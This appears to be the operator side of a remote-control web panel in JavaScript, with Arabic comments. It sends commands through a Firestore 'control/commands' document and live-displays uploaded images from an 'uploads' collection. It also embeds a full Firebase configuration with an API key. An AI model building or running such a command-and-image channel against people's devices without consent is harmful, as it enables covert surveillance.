import { initializeApp } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyDX0esBRiQ4MuyvWH_s2UZ2kJpA9GryDgE",
    authDomain: "tttttt-48c2e.firebaseapp.com",
    databaseURL: "https://tttttt-48c2e-default-rtdb.firebaseio.com",
    projectId: "tttttt-48c2e",
    storageBucket: "tttttt-48c2e.firebasestorage.app",
    messagingSenderId: "982883301644",
    appId: "1:982883301644:web:7b1676215cb4f0fe7c7129",
    measurementId: "G-QLCYC16T20"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// تثبيت الدالة عالمياً لتعمل الأزرار
window.sendCmd = async (command) => {
    try {
        await setDoc(doc(db, "control", "commands"), { cmd: command, time: Date.now() });
        console.log("تم إرسال:", command);
    } catch (e) { console.error("Error:", e); }
};

// مراقبة الصور الجديدة وعرضها فوراً
const q = query(collection(db, "uploads"), orderBy("time", "desc"));
onSnapshot(q, (snapshot) => {
    const stream = document.getElementById('dataStream');
    stream.innerHTML = "";
    snapshot.forEach((doc) => {
        const data = doc.data();
        const img = document.createElement('img');
        img.src = data.url;
        img.style.width = "150px";
        img.style.margin = "5px";
        img.style.border = "1px solid #0f0";
        stream.appendChild(img);
    });
});
